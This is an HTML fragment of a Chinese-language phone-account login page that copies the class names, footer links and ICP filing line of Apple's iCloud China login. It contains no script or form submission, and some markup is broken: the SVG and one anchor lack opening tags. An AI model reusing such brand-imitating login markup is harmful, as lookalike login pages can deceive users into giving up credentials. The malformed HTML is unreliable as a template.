<body>
  <div class="login-container">
    <header class="toolbar-banner" role="banner">
      <div class="application-toolbar login-theme">
        <div class="toolbar-container">
          <div class="application-toolbar-start-view">
            <h1>LOGIN</h1>
          </div>
          <div class="application-toolbar-end-view">
            <div class="cloudos-application-toolbar-end-view">
              <div class="toolbar-buttons-container">
                <ui-button class="push primary toolbar-icon-button help-icon" ontouchstart="void(0)" role="button"
                  aria-label="帮助菜单" aria-haspopup="menu" tabindex="0">

                    class=" glyph-box" height="19" width="19">
                    <g transform="matrix(1 0 0 1 -8.740048828125055 45.0205078125)">
                      <path
                        d="M28.418-35.2051C28.418-40.625 24.0234-44.9707 18.5059-44.9707C13.1348-44.9707 8.74023-40.625 8.74023-35.2051C8.74023-29.7852 13.1348-25.4395 18.5059-25.4395C24.0234-25.4395 28.418-29.7852 28.418-35.2051ZM64.5508-35.2051C64.5508-40.625 60.2051-44.9707 54.7852-44.9707C49.4141-44.9707 45.0684-40.625 45.0684-35.2051C45.0684-29.7852 49.4141-25.4395 54.7852-25.4395C60.2051-25.4395 64.5508-29.7852 64.5508-35.2051ZM100.83-35.2051C100.83-40.625 96.4844-44.9707 91.0645-44.9707C85.5469-44.9707 81.2012-40.625 81.2012-35.2051C81.2012-29.7852 85.5469-25.4395 91.0645-25.4395C96.4844-25.4395 100.83-29.7852 100.83-35.2051Z">
                      </path>
                    </g>
                  </svg>
                </ui-button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </header>
    <section>
      <div class="home-login-component">
        <div class="parent-container is-visible">
          <div style="visibility: visible; height: auto;">
            <div class="widget-icon-text">
              <img class="icon" draggable="false" alt="" aria-hidden="true" src="./../assets/icons/verge.png">
              <div class="sign-in-label">使用手机账号登录</div>
            </div>
            <div class="phone-number-container apple-id-frame-value">
              <div>
                <input type="text" placeholder="手机账号"><input type="button" value="确认">
              </div>
              <div>
                <input type="text" placeholder="手机账号"><input type="button" value="登录">
              </div>
            </div>
            <div class="keep-state">
              <input type="checkbox" name="" id=""><text class="" selectable="false" space="false" decode="false">
                保持我的登录状态
              </text>
            </div>
            <div class="create">
              <a target="_blank" rel="noopener noreferrer">忘记账号或者密码</a>
              <br>
              <a target="_blank" rel="noreferrer">注册账号</a>
            </div>
          </div>
        </div>
      </div>
    </section>
    <footer>
      <div class="legal-footer">
        <div class="application-content">
          <div class="legal-footer-content">
            <div class="inner-row" role="presentation">
              <div class="with-separator"><a class="systemStatus" target="_blank" rel="noreferrer"
                  href="https://www.apple.com/support/systemstatus/" aria-label="系统状态 （在新标签页中打开）">系统状态</a>

                  href="https://www.icloud.com.cn/gcbd-privacy-policy/" aria-label="隐私政策 （在新标签页中打开）">隐私政策</a>
                <div aria-hidden="true" class="separator"></div>
              </div>
              <div class="with-separator"><a class="terms" target="_blank" rel="noreferrer"
                  href="https://www.apple.com/legal/internet-services/icloud/" aria-label="条款与条件 （在新标签页中打开）">条款与条件</a>
                <div aria-hidden="true" class="separator"></div>
              </div><a class="chinaICP" target="_blank" rel="noreferrer"
                href="https://beian.miit.gov.cn">黔ICP备18008477号</a>

            </div>
